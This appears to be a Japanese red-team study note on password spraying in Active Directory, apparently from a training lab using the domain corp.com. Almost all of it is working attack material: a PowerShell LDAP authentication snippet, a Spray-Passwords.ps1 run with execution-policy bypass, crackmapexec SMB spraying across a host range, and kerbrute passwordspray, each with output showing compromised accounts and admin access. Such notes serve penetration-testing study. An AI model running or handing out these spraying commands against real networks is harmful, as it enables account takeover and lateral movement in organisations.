---
title: Password (Spray) Attack
parent: Active Directory
grand_parent: Red Team
---

# アカウントポリシーを取得
ロックアウト回数及び解除時間を把握しておく
```powershell
net accounts
```

# DirectoryEntryを使った認証
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
成功例
```powershell
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
peteとして成功

失敗例
```powershell
"distinguishedName": "The user name or password is incorrect."
```

## スクリプトパスワードスプレー
```powershell
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

```
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

# SMBパスワードスプレー
## crackmapexec
crackmapexec はパスワードスプレーを実行する前にドメインのパスワードポリシーを確認しない点に注意が必要

```bash
crackmapexec smb 192.168.206.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
- プロトコル smb 
- ドメインに参加しているターゲットの IP アドレス（例: CLIENT75 (192.168.50.75)）を入力
- -u ユーザー名
- -p パスワードのリストまたは個々のユーザー名とパスワードを指定
- -dにドメイン名
- --continue-on-success 最初の有効な認証情報で停止しない
- users.txt dave、jen、peteのサブセットを含むテキストファイル

```bash
SMB  192.168.206.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB  192.168.206.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB  192.168.206.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
SMB  192.168.206.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
```

crackmapexecの出力には、認証情報が有効かどうかだけでなく、特定された認証情報を持つユーザーがターゲットシステム上で管理者権限を持っているかどうかも表示される
```bash
crackmapexec smb 192.168.206.75 -u dave -p 'Flowers1' -d corp.com
```

```bash
SMB  192.168.206.75  445    CLIENT75  [+] corp.com\dave:Flowers1 (Pwn3d!)
```
- (Pwn3d!) ターゲットシステム上で管理者権限を持っていることを示す

## 複数端末への試行
```bash
crackmapexec smb 192.168.206.70-76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```

```bash
SMB  192.168.206.73  445    FILES04          [+] corp.com\pete:Nexus123! 
SMB  192.168.206.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
SMB  192.168.206.72  445    WEB04            [+] corp.com\pete:Nexus123! 
SMB  192.168.206.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
SMB  192.168.206.70  445    DC1              [+] corp.com\pete:Nexus123! 
SMB  192.168.206.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 

```
---

# kerbruteパスワードスプレー
pete、dave、jenを含むusernames.txtというファイルを作成
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

```bash
2025/08/17 09:50:02 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2025/08/17 09:50:02 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
```
---
